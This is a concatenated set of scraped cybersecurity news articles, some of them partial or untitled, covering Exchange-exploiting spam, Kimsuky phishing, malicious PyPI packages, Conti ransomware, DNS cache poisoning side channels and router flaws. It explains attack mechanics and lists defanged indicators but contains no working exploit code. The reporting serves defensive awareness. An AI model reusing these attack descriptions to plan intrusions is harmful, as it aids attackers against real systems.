man-in-the-middle (MITM) attack that intercepts encrypted traffic between a site visitor and an affected site,“ Maunder said.\nUpdateA data breach at web hosting company GoDaddy might run deeper than the firm has so far been prepared to admit, as multiple subsidiaries of the company’s Managed WordPress services, including 123Reg, Domain Factory, Heart Internet, Host Europe, Media Temple and tsoHost, have been found affected.\nGoDaddy told Wordfence that a “small number of active and inactive Managed WordPress users at those brands were impacted,“ although It’s unclear exactly how many additional users may have had their sensitive details exposed in the wake of the security incident.\n\n\nFound this article interesting?

{'title': 'Hackers Exploiting ProxyLogon and ProxyShell Flaws in Spam Campaigns',
'text': 'Threat actors are exploiting ProxyLogon and ProxyShell exploits in unpatched Microsoft Exchange Servers as part of an ongoing spam campaign that leverages stolen email chains to bypass security software and deploy malware on vulnerable systems.\nThe findings come from Trend Micro following an investigation into a number of intrusions in the Middle East that culminated in the distribution of a never-before-seen loader dubbed SQUIRRELWAFFLE. First publicly documented by Cisco Talos, the attacks are believed to have commenced in mid-September 2021 via laced Microsoft Office documents.\n“It is known for sending its malicious emails as replies to pre-existing email chains, a tactic that lowers a victim’s guard against malicious activities,“ researchers Mohamed Fahmy, Sherif Magdy, Abdelrhman Sharshar said in a report published last week. “To be able to pull this off, we believe it involved the use of a chain of both ProxyLogon and ProxyShell exploits.“\n\nProxyLogon and ProxyShell refer to a collection of flaws in Microsoft Exchange Servers that could enable a threat actor to elevate privileges and remotely execute arbitrary code, effectively granting the ability to take control of the vulnerable machines. While the ProxyLogon flaws were addressed in March, the ProxyShell bugs were patched in a series of updates released in May and July.\nDLL infection flow\nTrend Micro said it observed the use of public exploits for CVE-2021-26855 (ProxyLogon), CVE-2021-34473, and CVE-2021-34523 (ProxyShell) on three of the Exchange servers that were compromised in different intrusions, using the access to hijack legitimate email threads and send malicious spam messages as replies, thereby increasing the likelihood that unsuspecting recipients will open the emails.\n“Delivering the malicious spam using this technique to reach all the internal domain users will decrease the possibility of detecting or stopping the attack, as the mail getaways will not be able to filter or quarantine any of these internal emails,“ the researchers said, adding the attackers behind the operation did not carry out lateral movement or install additional malware so as to stay under the radar and avoid triggering any alerts.\n\nThe attack chain involves rogue email messages containing a link that, when clicked, drops a Microsoft Excel or Word file. Opening the document, in turn, prompts the recipient to enable macros, ultimately leading to the download and execution of the SQUIRRELWAFFLE malware loader, which acts as a medium to fetch final-stage payloads such as Cobalt Strike and Qbot.\nThe development marks a new escalation in phishing campaigns where a threat actor has breached corporate Microsoft Exchange email servers to gain unauthorized access to their internal mail systems and distribute malicious emails in an attempt to infect users with malware.\n“SQUIRRELWAFFLE campaigns should make users wary of the different tactics used to mask malicious emails and files,“ the researchers concluded. “Emails that come from trusted contacts may not be enough of an indicator that whatever link or file included in the email is safe.“\n\n\nFound this article interesting?

'text': 'Meta, the parent company of Facebook, Instagram, and WhatsApp, disclosed that it doesn’t intend to roll out default end-to-end encryption (E2EE) across all its messaging services until 2023, pushing its original plans by at least a year.\n“We’re taking our time to get this right and we don’t plan to finish the global rollout of end-to-end encryption by default across all our messaging services until sometime in 2023,“ Meta’s head of safety, Antigone Davis, said in a post published in The Telegraph over the weekend.\nThe new scheme, described as a “three-pronged approach,“ aims to employ a mix of non-encrypted data across its apps as well as account information and reports from users to improve safety and combat abuse, noting that the goal is to deter illegal behavior from happening in the first place, giving users more control, and actively encouraging users to flag harmful messages. Meta had previously outlined plans to be “fully end-to-end encrypted until sometime in 2022 at the earliest.“\nThe Menlo Park-based tech company’s products are used by 2.81 billion users on a daily basis as of September 2021.\n\nThe shift to encryption is a crucial element of Meta’s proposals to build a unified privacy-focused communications platform it announced in March 2019, with CEO Mark Zuckerberg stating that the “future of communication will increasingly shift to private, encrypted services where people can be confident what they say to each other stays secure and their messages and content won’t stick around forever.“\nTo that end, the social media giant merged Messenger and Instagram chats last year to allow cross-app communications among its family of popular apps. It’s worth noting that while WhatsApp is end-to-end encrypted by default, Facebook Messenger and Instagram are not. The company first launched E2EE in its Messenger app in 2016, though it’s only available by switching to a “Secret Conversation“ mode that’s limited to mobile apps. \nMeta has since extended E2EE for voice and video calls in Messenger earlier this August, along with launching a new opt-in setting as part of a limited test in certain countries that will turn on the feature for Instagram Direct Messages.\nThe development comes as questions are being raised about how platforms could enable E2EE while also supporting law enforcement investigations, raising concerns that wider encryption protections could acutely curtail efforts to tackle child sexual abuse and other problematic content.\n“Sadly, at a time when we need to be taking more action... Facebook is still pursuing end-to-end encryption plans that place the good work and the progress that has already been made at jeopardy,“ U.K. General Secretary Priti Patel said in April. “We cannot allow a situation where law enforcement’s ability to tackle abhorrent criminal acts and protect victims is severely hampered.“\n\nComplicating matters are new regulations in India that require messaging apps to trace the “first originator“ of messages shared on WhatsApp, in a move that could break encryption safeguards, prompting the company to file a lawsuit on the grounds that such a provision invades users’ privacy.\nThe Indian government, in an affidavit filed in response late last month, defended the law claiming platforms that “monetize users’ information for business/commercial purposes are not legally entitled to claim that it protects privacy,“ and that such a rule is essential to counter fake news and offences concerning national security and public order.\n“The Rule does not contemplate the platforms breaking the end-to-end encryption. The Rule only contemplates the platform to provide the details of the first originator by any means or mechanism available with the platform. If the platform does not have such means, the platform ought to develop such [a] mechanism considering the platform’s widespread prevalence and the larger public duty,“ the affidavit said.\n\n\nFound this article interesting?

What’s more, despite maintaining entrenched access, the group hasn’t been observed conducting attacks that are motivated by financial gain and involve encrypting victim infrastructure, or demanding ransoms for stolen data.\n\nRather, the emphasis appears to be to obtain valuable information as covertly as possible using a combination of self-developed and publicly available programs to gain initial access using social engineering means, perform reconnaissance, achieve persistence, move laterally, and exfiltrate sensitive documentation.\n\n“Espionage in cyberspace is a hallmark of state-sponsored advanced persistent threats,“ the researchers said. “In most cases, such attacks target other states or state-owned companies. Corporate cyber espionage is still a relatively rare and, in many ways, unique occurrence. However, it is possible that the group’s success could lead to a new trend in cybercrime.“\n\n\nFound this article interesting?

'text': 'A threat actor with ties to North Korea has been linked to a prolific wave of credential theft campaigns targeting research, education, government, media and other organizations, with two of the attacks also attempting to distribute malware that could be used for intelligence gathering.\nEnterprise security firm Proofpoint attributed the infiltrations to a group it tracks as TA406, and by the wider threat intelligence community under the monikers Kimsuky (Kaspersky), Velvet Chollima (CrowdStrike), Thallium (Microsoft), Black Banshee (PwC), ITG16 (IBM), and the Konni Group (Cisco Talos).\nPolicy experts, journalists and nongovernmental organizations (NGOs) were targeted as part of weekly campaigns observed between from January through June 2021, Proofpoint researchers Darien Huss and Selena Larson disclosed in a technical report detailing the actor’s tactics, techniques, and procedures (TTPs), with the attacks spread across North America, Russia, China, and South Korea.\nKnown to be operational as early as 2012, Kimsuky has since emerged as one of the most active advanced persistent threat (APT) group known for setting its sights on cyber espionage but also for conducting attacks for financial gain, targeting government entities, think tanks, and individuals identified as experts in various fields as well as harvest sensitive information pertaining to foreign policy and national security issues.\n\n“Like other APT groups that constitute a big umbrella, Kimsuky contains several clusters: BabyShark, AppleSeed, Flower Power, and Gold Dragon,“ Kaspersky researchers noted in their Q3 2021 APT trends report published last month. The AppleSeed sub-group is also referred to as TA408.\nThe group is also known for reeling in targets with convincing social engineering schemes and watering hole attacks before sending them malware-infected payloads or tricking them into submitting sensitive credentials to phishing sites, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) said in a public alert issued in October 2020.\nEarlier this month, researchers from Cisco Talos disclosed an ongoing Kimsuky campaign since June 2021 that was found leveraging malicious blogs hosted on Google’s Blogger platform to target high-value South Korean targets, including geopolitical and aerospace research agencies, with the goal of delivering a “constantly evolving set of implants derived from the Gold Dragon/Brave Prince family“ that act as file exfiltrators, information gatherers, and credential stealers for reconnaissance, espionage, and credential harvesting.\n\n“This campaign begins with malicious Microsoft Office documents (maldocs) containing macros being delivered to victims,“ Talos researchers explained. “The infection chain results in the malware reaching out to malicious blogs set up by the attackers. These blogs provide the attackers the ability to update the malicious content posted in the blog depending on whether a victim is of value to the attackers.“\nNow in what appears to be a further ramping up of attacks, the threat actor simultaneously commenced near-weekly email threat campaigns using the identities of legitimate policy experts, while featuring themes related to nuclear weapon safety, politics, and Korean foreign policy, ultimately luring the targeted individuals to give up their corporate credentials via a rogue URL embedded in the messages that redirect the victims to custom credential-harvesting pages.\nKimsuky’s phishing campaigns had a noticeable shift in March 2021 when the emails moved beyond credential theft to become a medium for distributing malware, coinciding with North Korea’s missile tests conducted later that month.\n\nThe emails included a link that sent the target to an attacker-controlled domain used to trick targets into downloading a compressed archive incorporating a binary, which is orchestrated to create a scheduled task that is executed every 15 minutes to install additional malware from a remote server. However, the ultimate motive behind the attacks remains unclear as no follow-on payloads were observed.\nAnother notable attack in June resulted in the deployment of a downloader (“FatBoy“) using an HTML attachment lure that was then used to retrieve a next-stage reconnaissance script capable of collecting “extensive information“ about the targeted device. Proofpoint said that both the campaigns exhibited overlaps with attacks previously identified as mounted by the Konni Group.\nOther notable tools in its malware arsenal encompass a Windows keylogger dubbed YoreKey, a number of rogue Android apps striking cryptocurrency users in South Korea, a deobfuscation service named Deioncube to decode files encrypted with ionCube’s source code protection software, and a sextortion scam that urges email recipients to transfer an amount worth $500 in bitcoin to a valid wallet associated with a South Korea-based NGO.\n“It’s unknown whether the NGO was compromised, and the donation message was placed on their website maliciously, or if there’s another explanation,“ the researchers said. “As of June 2021, the associated bitcoin wallet had received and sent about 3.77 bitcoin.“\n\n\nFound this article interesting?

'text': 'Cybersecurity researchers have uncovered as many as 11 malicious Python packages that have been cumulatively downloaded more than 41,000 times from the Python Package Index (PyPI) repository, and could be exploited to steal Discord access tokens, passwords, and even stage dependency confusion attacks.\nThe Python packages have since been removed from the repository following responsible disclosure by DevOps firm JFrog —\nimportantpackage / important-packagepptestipboardsowlmoonDiscordSafetytrrfab10Cent10 / 10Cent11yandex-ytyiffparty\nTwo of the packages (“importantpackage,“ “10Cent10,“ and their variants) were found obtaining a reverse shell on a compromised machine, giving the attacker full control over the system. Two other packages “ipboards“ and “trrfab“ masqueraded as legitimate dependencies designed to be automatically imported by taking advantage of a technique called dependency confusion or namespace confusion.\n\nUnlike typosquatting attacks, where a malicious actor deliberately publishes packages with misspelled names of popular variants, dependency confusion works by uploading to public repositories a number of poisoned components with names that are the same as the legitimate internal private packages, but with a higher version, effectively forcing the target’s package manager to download and install the malicious module.\nThe dependency “importantpackage“ also stands out for its novel exfiltration mechanism to evade network-based detection, which involves using Fastly’s content delivery network (CDN) to mask its communications with the attacker-controlled server as communication with pypi[.]org.\nThe malicious code “causes an HTTPS request to be sent to pypi.python[.]org (which is indistinguishable from a legitimate request to PyPI), which later gets rerouted by the CDN as an HTTP request to the [command-and-control] server,“ JFrog researchers Andrey Polkovnychenko and Shachar Menashe explained in a report published Thursday.\n\nLastly, both “ipboards“ and a fifth package named “pptest“ were discovered using DNS tunneling as a data exfiltration method by relying on DNS requests as a channel for communication between the victim machine and the remote server. JFrog said it’s the first time the technique has been spotted in malware uploaded to PyPI.\nEfforts to target popular code registries like Node Package Manager (NPM) JavaScript registry, PyPI, and RubyGems have become commonplace and a new frontier for an array of attacks. \n“Package managers are a growing and powerful vector for the unintentional installation of malicious code, and […] attackers are getting more sophisticated in their approach,“ said Menashe, JFrog’s senior director of research. “The advanced evasion techniques used in these malware packages, such as novel exfiltration or even DNS tunneling signal a disturbing trend that attackers are becoming stealthier in their attacks on open-source software.“\n\nIndeed, after at least three NPM developer accounts were compromised by bad actors to insert malicious code into popular packages “ua-parser-js,“ “coa,“ and “rc,“ GitHub earlier this week outlined plans to tighten the security of the NPM registry by requiring two-factor authentication (2FA) for maintainers and admins starting in the first quarter of 2022.\nThe development also comes as the software development and version control platform disclosed that it addressed multiple flaws in the NPM registry that could have leaked the names of private packages and allowed attackers to bypass authentication and publish versions of any package without requiring any authorization.\n\n\nFound this article interesting?

'text': 'The U.S. government on Thursday unsealed an indictment that accused two Iranian nationals of their involvement in cyber-enabled disinformation and threat campaign orchestrated to interfere in the 2020 presidential elections by gaining access to confidential voter information from at least one state election website.\nThe two defendants in question — Seyyed Mohammad Hosein Musa Kazemi, 24, and Sajjad Kazemi, 27 — have been charged with conspiracy to commit computer fraud and abuse, intimidate voters, and transmit interstate threats, voter intimidation, transmission of interstate threats, with Kazemi additionally charged with unauthorized computer intrusion. Both the individuals are currently at large.\n\nThe influence campaign’s goal was to erode confidence in the integrity of the U.S. electoral system and to sow discord among Americans, the Department of Justice (DoJ) said in a statement, characterizing the two individuals as “experienced Iran-based computer hackers“ who carried out the attacks during their work as contractors for an Iranian company named Emennet Pasargad (formerly Eeleyanet Gostar).\nAs part of the coordinated election interference scheme, Kazemi and Kazemi are alleged to have attempted to compromise nearly 11 state voter registration and information websites between September and October 2020, successfully breaching a misconfigured computer system in an unnamed state to retrieve details associated with more than 100,000 voters.\nThe siphoned data was then used to simulate intrusions that the Democratic Party was supposedly planning to carry out by exploiting election infrastructure vulnerabilities to register non-existent voters and edit mail-in ballots, all of which were captured in the form of a “False Election Video“ that was distributed to Republican Senators, White House advisors, and several members of the media.\n\n“The access of voter registration data appeared to involve the abuse of website misconfigurations and a scripted process using the cURL tool to iterate through voter records,“ the U.S. Cybersecurity and Infrastructure Security Agency (CISA) noted back in November 2020. “A review of the records that were copied and obtained reveals the information was used in the propaganda video.“\nBesides the aforementioned activities, the defendants are said to have sent threatening email messages to intimidate and interfere with voters and successfully gained unauthorized access to an unspecified media company’s computer network using stolen credentials with the goal of disseminating false claims after the election on November 4, 2020. The attacks were ultimately foiled, the DoJ said.\n\nIn a related development, the Treasury Department’s Office of Foreign Assets Control (OFAC) announced sanctions against Kazemi and Kashian, and four other Emennet employees, for carrying out disruptive cyber operations against the U.S. and providing technological support to the Iranian Islamic Revolutionary Guard Corps, even as the State Department offered a reward of up to $10 million for information about the whereabouts of these two individuals or their activities.\nThe indictments come a little over a year after CISA and the Federal Bureau of Investigation (FBI) issued an advisory warning of Iranian threat actors’ endeavors to influence and interfere with the U.S. elections by “creating fictitious media sites and spoofing legitimate media sites to spread obtained U.S. voter-registration data, anti-American propaganda, and misinformation about voter suppression, voter fraud, and ballot fraud.“\nIranian hacking groups have been in the spotlight in the past few days, with cybersecurity agencies across the U.S., U.K., and Australia alerting of ongoing malicious infiltrations targeting organizations worldwide by exploiting Fortinet and Microsoft Exchange ProxyShell vulnerabilities to exfiltrate sensitive data and increasingly deploy ransomware.\n\n\nFound this article interesting?

The security flaw impacts the web management interface of FatPipe WARP, MPVPN, and IPVPN router clustering and VPN load-balancing devices running software prior to the latest version releases 10.1.2r60p93 and 10.2.2r44p1.\n\nThe FBI, in its flash alert, noted that the threat actor leveraged the web shell to move laterally and strike additional U.S. infrastructure by setting up a malicious SSH service, following it up with a number of steps designed to hide the intrusions and protect their exploit until it’s needed again.\n\nIn an independent bulletin (FPSA006), FatPipe said that the bug stems from a lack of input validation mechanism for specific HTTP requests, thus enabling an attacker to exploit the issue by sending a specially crafted HTTP request to the affected device. While there are no workarounds that address the flaw, the company said it can be mitigated by disabling UI and SSH access on the WAN interface or configuring Access Lists to permit access only from trusted sources.\n\n\nFound this article interesting?

{'title': 'A Simple 5-Step Framework to Minimize the Risk of a Data Breach',
'text': 'Today’s businesses run on data. They collect it from customers at every interaction, and they use it to improve efficiency, increase their agility, and provide higher levels of service. But it’s becoming painfully obvious that all of that data businesses collect has also made them an enticing target for cybercriminals.\nWith each passing day, the evidence of that grows. In the last few months, we’ve witnessed massive data breaches that targeted Neiman Marcus, Facebook, and the Robinhood stock trading app. And they’re hardly alone. In recent years, the number of data breaches worldwide has averaged close to three per day.\nThat statistic suggests that the average business has a target on its back and is running out of time to mount a defense of its data. And doing so doesn’t have to be difficult. To help, here’s a simple 5-step framework businesses of all sizes can use to protect their customer data.\nStep One: Review and Adapt Data Collection Standards\nThe first step businesses need to take to increase the security of their customer data is to review what types of data they’re collecting and why. Most companies that undertake this exercise end up surprised by what they find. That’s because, over time, the volume and variety of customer information that gets collected to expand well beyond a business’s original intent.\nFor example, it’s fairly standard to collect things like a customer’s name and email address. And if that’s all a business has on file, they won’t be an attractive target to an attacker. But if the business has a cloud call center or any type of high touch sales cycle or customer support it probably collects home addresses, financial data, and demographic information, they’ve then assembled a collection that’s perfect for enabling identity theft if the data got out into the wild.\nSo, when evaluating each collected data point to determine its value, businesses should ask themselves: what critical business function does this data facilitate. If the answer is none, they should purge the data and stop collecting it. If there’s a valid answer, but of a function that’s not critical, the business should weigh the benefits the data creates against the possible harm they’d suffer if it were exposed in a breach.\nStep Two: Minimize Data Access\nAfter paring down the amount of data to protect, the next step is to reduce the data’s attack surface by minimizing who has access to it. Access controls play an outsize role in data protection because the theft of user credentials is the primary way that malicious actors find their way into protected systems. For that reason, businesses need to apply the principle of least privilege (PoLP) to both their data repositories as well as the systems that connect to them.\nAnd minimizing access to data has another beneficial side effect: it helps to prevent insider threats from causing a data breach. Research firm Forrester predicted that insider threats would lead to 31% of breaches this year – a number that will only grow from there. So, by keeping sensitive customer data out of most employees’ hands in the first place, businesses are addressing internal and external threats at the same time.\nStep Three: Eliminate Passwords Wherever Possible\nEven after reducing the number of people that have access to customer data, there’s still another way businesses can make it harder for hackers to gain access to it. And that’s to eliminate passwords as a primary authentication method wherever possible. It’s a small change that can make a world of difference.\nAccording to the 2021 Verizon Data Breach Investigations Report, 61% of all data breaches last year involved the use of credentials, stolen or otherwise. So it logically follows that the fewer credentials there are to worry about, the better. And there are a few ways to reduce reliance on conventional password authentication systems.\nOne is the use of two-factor authentication. This means accounts require both a password and a time-limited security token, typically delivered via app or SMS. But an even better approach is the use of hardware security keys. They’re physical devices that rely on unbreakable cryptographic credentials to control data access. With them in use, the threats of phishing and other social engineering attacks are greatly diminished. They’re the best current secure authentication method, at least until solutions like Hushmesh go mainstream.\nStep Four: Encrypt Data at Rest and in Motion\nWhile it is true that compromised credentials are by far the biggest threat to cause a data breach, they aren’t the only threat. It’s always possible for an attacker to exploit a software flaw or other security loophole to bypass the normal access control methods and gain access to customer data. Worst of all, such attacks are both difficult to detect and even harder to stop once in progress.\nThat’s why step four in any competent data protection plan is to ensure that all customer data remains encrypted at all times. This means using software that employs strong encryption as data passes through it, networking hardware and components that employ encryption, and a data storage system that allows for data encryption at rest. Doing this minimizes the data access an attacker could gain without credentials and can help contain the damage if a breach does occur.\nStep Five: Develop a Data Breach Response Plan\nNo matter how you look at it, there’s no such thing as perfect cybersecurity. Attackers are always hard at work looking for weaknesses to exploit. Businesses that prepare well will eliminate or minimize many of them. But that doesn’t mean a data breach will become impossible.\nThat’s why the final step in the customer data protection framework is to develop a data breach response plan. It should give the business a roadmap to help it respond if an attacker does gain access to customer data. The plan should spare no details – spelling out everything from how internal IT teams should react, who the go-to 3rd-party security consultants are, and how customers are to be notified of the breach.\nAnd that last part is quite possibly the most important. In the aftermath of a data breach, how a business goes about making its customers whole can determine how well it will bounce back, if at all. For example, it might be wise to partner with a consumer security firm like Aura to provide affected customers with financial fraud protection and identity protection in the aftermath of a breach. That will reduce the risk of any follow-on events that further damage the business’s reputation.\nThe Bottom Line\nThe simple fact is that businesses that have yet to suffer a data breach are operating on borrowed time. And the odds are very much against them. But applying the framework detailed here will go a long way toward shifting the odds back in their favor. It will minimize the risk of a data breach, limit the damage if one does occur, and help the company deal with the aftermath. In the imperfect world that is the world of cybersecurity, there isn’t much more any business can ask for.\n\n\nFound this article interesting?

{'title': 'Experts Expose Secrets of Conti Ransomware Group That Made 25 Million from Victims',
'text': 'The clearnet and dark web payment portals operated by the Conti ransomware group have gone down in what appears to be an attempt to shift to new infrastructure after details about the gang’s inner workings and its members were made public.\nAccording to MalwareHunterTeam, “while both the clearweb and Tor domains of the leak site of the Conti ransomware gang is online and working, both their clearweb and Tor domains for the payment site (which is obviously more important than the leak) is down.“\nIt’s not clear what prompted the shutdown, but the development comes as Swiss cybersecurity firm PRODAFT offered an unprecedented look into the group’s ransomware-as-a-service (RaaS) model, wherein the developers sell or lease their ransomware technology to affiliates hired from darknet forums, who then carry out attacks on their behalf while also netting about 70% of each ransom payment extorted from the victims.\n\nThe result? Three members of the Conti team have been identified so far, each playing the roles of admin (“Tokyo“), assistant (“it_work_support@xmpp[.]jp“), and recruiter (“IT_Work“) to attract new affiliates into their network.\nWhile ransomware attacks work by encrypting the victims’ sensitive information and rendering it inaccessible, threat actors have increasingly latched on to a two-pronged strategy called double extortion to demand a ransom payment for decrypting the data and threaten to publicly publish the stolen information if the payment is not received within a specific deadline.\n\n“Conti customers – affiliate threat actors – use [a digital] management panel to create new ransomware samples, manage their victims, and collect data on their attacks,“ noted the researchers, detailing the syndicate’s attack kill chain leveraging PrintNightmare (CVE-2021-1675, CVE-2021-34527, and CVE-2021-36958) and FortiGate (CVE-2018-13374 and CVE-2018-13379) vulnerabilities to compromise unpatched systems.\n\nEmerging on the cybercrime landscape in October 2019, Conti is believed to be the work of a Russia-based threat group called Wizard Spider, which is also the operator of the infamous TrickBot banking malware. Since then, at least 567 different companies have had their business-critical data exposed on the victim shaming site, with the ransomware cartel receiving over 500 bitcoin ($25.5 million) in payments since July 2021.\n\nWhat’s more, an analysis of ransomware samples and the bitcoin wallet addresses utilized for receiving the payments has revealed a connection between Conti and Ryuk, with both families heavily banking on TrickBot, Emotet, and BazarLoader for actually delivering the file-encrypting payloads onto victim’s networks via email phishing and other social engineering schemes.\n\nPRODAFT said it was also able to gain access to the group’s recovery service and an admin management panel hosted as a Tor hidden service on an Onion domain, revealing extensive details of a clearnet website called “contirecovery[.]ws“ that contains instructions for purchasing decryption keys from the affiliates. Interestingly, an investigation into Conti’s ransomware negotiation process published by Team Cymru last month highlighted a similar open web URL named “contirecovery[.]info.“\n“In order to tackle the complex challenge of disrupting cybercriminal organizations, public and private forces need to work collaboratively with one another to better understand and mitigate the wider legal and commercial impact of the threat,“ the researchers said.\nUpdate: The Conti ransomware’s payment portals are back up and running, more than 24 hours after they were first taken down in response to a report that identified the real IP address of one of its recovery (aka payment) servers — 217.12.204[.]135 — thereby effectively bolstering its security measures.\n “Looks like Europeans have also decided to abandon their manners and go full-gansta simply trying to break our systems,“the gang said in a statement posted on their blog, effectively confirming PRODAFT’s findings, but characterizing the details as “simply disinformation,“ and that “the reported 25kk which we ’made since July’ is straight-up BS - we’ve made around 300kk at least.“\n\n\nFound this article interesting?

{'title': 'New Side Channel Attacks Re-Enable Serious DNS Cache Poisoning Attacks',
'text': 'Researchers have demonstrated yet another variant of the SAD DNS cache poisoning attack that leaves about 38% of the domain name resolvers vulnerable, enabling attackers to redirect traffic originally destined to legitimate websites to a server under their control.\n“The attack allows an off-path attacker to inject a malicious DNS record into a DNS cache,“ University of California researchers Keyu Man, Xin’an Zhou, and Zhiyun Qian said. “SAD DNS attack allows an attacker to redirect any traffic (originally destined to a specific domain) to his own server and then become a man-in-the-middle (MITM) attacker, allowing eavesdropping and tampering of the communication.“\nThe latest flaw affects Linux kernels as well as popular DNS software, including BIND, Unbound, and dnsmasq running on top of Linux, but not when run on other operating systems FreeBSD or Windows.\nFrom Kaminsky Attack to SAD DNS\nDNS cache poisoning, also called DNS spoofing, is a technique in which corrupt data is introduced into a DNS resolver’s cache, so that DNS queries return an incorrect response (i.e., IP address) for a trusted domain (e.g., www.example.com) and users are directed to malicious websites. Originally discovered by researcher Dan Kaminsky in 2008, the attack stemmed from the fact that recursive resolvers typically used a single open port (usually 53) to send and receive messages to authoritative nameservers.\n\nThis not only made guessing the source port trivial, an adversary can forge a response by flooding the resolver with DNS responses for some or all of the 65 thousand or so possible transaction IDs that are attached to the DNS lookup requests sent to the nameservers.\nTo achieve this, all an attacker had to do was guess the 16-bit identifier — i.e., meaning there can be only 65,536 transaction ID values — which is used to verify the authenticity of the nameserver and prove that the IP address returned is legitimate. Thus in the event the malicious answer with the right transaction ID arrives before the response from the authoritative server, then the DNS cache would be poisoned, returning the attacker’s chosen address instead of the legitimate IP address.\n\nBut since the recursive resolver caches information received from authoritative nameservers, this also signifies that if the resolver receives a request for an IP address of a domain name that was recently requested by another client, it just replies back to the client the requested record from its cache without having to communicate with the nameservers.\nSince then, the attacks have been rendered unfeasible by increasing the entropy using the transaction ID along with a randomized UDP port as a second identifier instead of using the default port 53 for lookup queries. However, newly discovered leaky side channels have made it possible to derandomize the ephemeral port number, effectively undoing the protections.\nSAD DNS aka Side channel AttackeD DNS, disclosed by the same group of researchers in November 2020, relies on ICMP “port unreachable“ message as a means to infer which ephemeral port is used. While ICMP is necessary for routing diagnostic and error responses in an IP network, the protocol’s rate-limiting feature provides a mechanism for restricting the amount of bandwidth that may be used for inbound ICMP traffic on a port with the goal of preventing denial-of-service (DoS) attacks that can arise when an attacker tries overload the network with ICMP messages.\n\nThe novel side channel attack involves the attacker sending a number of spoofed UDP probes containing the victim’s forged source address to the target that’s large enough to trigger the rate-limiting, using the technique to narrow down the open ports and guess the transaction ID, like it’s in the case of the original Kaminsky attack.\n\n“Specifically, if a guessed port number (in a spoofed UDP probe) happens to match the correct ephemeral port, the resolver will not generate an ICMP message (otherwise it would),“ the researchers said. “This results in either a stationary limit counter or a decrement of the counter. An attacker can then check whether the counter has been drained by attempting to solicit ICMP responses with a UDP probe from his real/non-spoofed IP.“\nA previously overlooked attack surface\nWhile prior methods, counting SAD DNS, employ UDP probes to determine whether a UDP port is open or closed, the newly discovered DNS cache poisoning attack directly explores a side channel during the process of handling ICMP error messages — i.e., ICMP frag needed or ICMP redirect packets — that by design do not elicit a response, using it as a yardstick to achieve the same goal.\n“An attacker does not necessarily have to rely on the explicit feedback from an ICMP probe,“ the researchers noted. “Instead, even if the processing of ICMP probes is completely silent, as long as there is some shared resource whose state is influenced, we may find ways (other probes) to observe the changed state of the shared resource.“\n  var adpushup = adpushup || {}; adpushup.que = adpushup.que || []; adpushup.que.push(function() { adpushup.triggerAd(“c642f0d8-e2f2-48f9-8dd1-c9ca934ec74e“); });  \nThe central idea of the attack is to use the limited number of total slots in the global exception cache, a 2048-bucket hash table, to discern if an update has occurred following a batch of ICMP probes. The side channel is also different from SAD DNS in that it arises when processing incoming ICMP messages (as opposed to egress packets) and it “leverages the space resource limit (i.e., the space for storing the next hop exception cache is limited) while SAD DNS’ side channel leverages the time resource limit (i.e., ICMP error generating rate is limited).“\nThe researchers propose a number of mitigations to prevent the latest attack, such as randomizing the caching structure, rejecting ICMP redirect messages, and setting the socket option IP_PMTUDISC_OMIT, which instructs the underlying operating system not to accept the ICMP frag needed messages and therefore completely eliminates the side channel related processing in the kernel.\n“DNS is one of the fundamental and ancient protocols on the Internet that supports many network applications and services,“ the researchers said. “Unfortunately, DNS was designed without security in mind and is subject to a variety of serious attacks, one of which is the well-known DNS cache poisoning attack. Over the decades of evolution, it has proven extraordinarily challenging to retrofit strong security features into it.“\n\n\nFound this article interesting?

'text': 'Networking equipment company Netgear has released yet another round of patches to remediate a high-severity remote code execution vulnerability affecting multiple routers that could be exploited by remote attackers to take control of an affected system.\nTracked as CVE-2021-34991 (CVSS score: 8.8), the pre-authentication buffer overflow flaw in small office and home office (SOHO) routers can lead to code execution with the highest privileges by taking advantage of an issue residing in the Universal Plug and Play (UPnP) feature that allows devices to discover each other’s presence on the same local network and open ports needed to connect to the public Internet.\n\nBecause of its ubiquitous nature, UPnP is used by a wide variety of devices, including personal computers, networking equipment, video game consoles and internet of things (IoT) devices.\nSpecifically, the vulnerability stems from the fact that the UPnP daemon accepts unauthenticated HTTP SUBSCRIBE and UNSUBSCRIBE requests — which are event notification alerts that devices use to receive notifications from other devices when certain configuration changes, such as media sharing, happen.\nBut according to GRIMM security researcher Adam Nichols, there exists a memory stack overflow bug in the code that handles the UNSUBSCRIBE requests, which enables an adversary to send a specially crafted HTTP request and run malicious code on the affected device, including resetting the administrator password and delivering arbitrary payloads. Once the password has been reset, the attacker can then login to the webserver and modify any settings or launch further attacks on the webserver.\n\n“Since the UPnP daemon runs as root, the highest privileged user in Linux environments, the code executed on behalf of the attacker will be run as root as well,“ Nichols said. “With root access on a device, an attacker can read and modify all traffic that is passed through the device.“\n\nThis is far from the first time vulnerable implementations of UPnP have been uncovered in networked devices.\nIn June 2020, security researcher Yunus Çadirci discovered what’s called a CallStranger vulnerability (CVE-2020-12695, CVSS score: 7.5) wherein a remote, unauthenticated attacker may be able to abuse the UPnP SUBSCRIBE capability to send traffic to arbitrary destinations, resulting in amplified DDoS attacks and data exfiltration. What’s more, no fewer than 45,000 routers with vulnerable UPnP services were previously leveraged in a 2018 campaign to deploy EternalBlue and EternalRed exploits on compromised systems. \n\n\nFound this article interesting?

Proactive cyber security professionals will find that an effective security awareness training program can significantly reduce their risk of getting exposed to a cyber incident.\nFor a security awareness training program to be successful, it must be measurable and yield positive, actionable results over time. \nThe following looks at what good security awareness looks like and how vital phishing simulations and awareness training is in devising effective cyber security programs. \nThe essentials of a cyber security awareness training program\nEmployees represent security risks mainly because they are unaware of how their actions and decisions cause security incidents. To address this cause, enterprises undertake extensive security awareness training efforts to help employees know what they should and shouldn’t do when working digitally.\nThe mere act of exposing employees to security training is not enough; a program is not effective unless it produces results in building real skills that change employee behavior and empower them to make the right choice in the face of a cyberattack. \nTo achieve this, companies must select a security awareness training that is data-driven, adaptive per employee location, takes into account role and behavior towards cyber training, is continuous and high-frequency, and engages each employee at least once a month.\nSome of the key features organizations should be looking for in a security awareness program can be divided into the following.\nContinuous cyber education training and a hands-on approach\nThe more employees are exposed to real-life phishing emails and other security risks, the more likely they are to succeed in protecting the organization and assets against phishing, malware, and many other threats. However, with cybersecurity awareness, theoretical knowledge becomes even more valuable when put into practice. Therefore training must become a hands-on learning experience with simulations and concrete action.\nIdentify weakest links and employ real-time feedback\nStatistically, fewer than 20 percent of employees in an organization are responsible for most human error-induced mistakes. To make sure all employees are properly trained, organizations must run simulations frequently - at least once a month. This is also where continuous feedback loops come into play. By engaging or disengaging with the content, employees reflect on the security gap that exists 